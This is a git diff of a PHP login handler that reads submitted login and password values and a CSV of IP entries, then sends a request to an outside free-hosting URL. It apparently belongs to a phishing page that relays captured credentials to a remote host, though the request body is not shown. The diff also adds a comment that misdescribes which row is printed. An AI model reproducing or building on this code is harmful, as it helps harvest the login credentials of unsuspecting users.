@@ -4,23 +4,18 @@
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
 
-    $filename = './secure/ip_table.csv';
-    $data = [];
-
-    // open the file
-    $f = fopen($filename, 'r');
-
-    if ($f === false) {
-        die('Cannot open the file ' . $filename);
+    $row = 1;
+    $mycsvfile = array(); //define the main array.
+    if (($handle = fopen("./secure/ip_table.csv", "r")) !== FALSE) {
+    while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
+        $num = count($data);
+        $row++;
+        $mycsvfile[] = $data; //add the row to the main array.
+    }
+    fclose($handle);
     }
 
-    // read each line in CSV file at a time
-    while (($row = fgetcsv($f)) !== false) {
-        $data[] = $row;
-    }
-
-    // close the file
-    fclose($f);
+    echo $mycsvfile[0][1]; //prints the 4th row, second column.
 
 
 
@@ -42,7 +37,6 @@
     );
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
-    echo json_encode($data);
     
 
     // header('Location: '."https://sparkling1234.000webhostapp.com/");
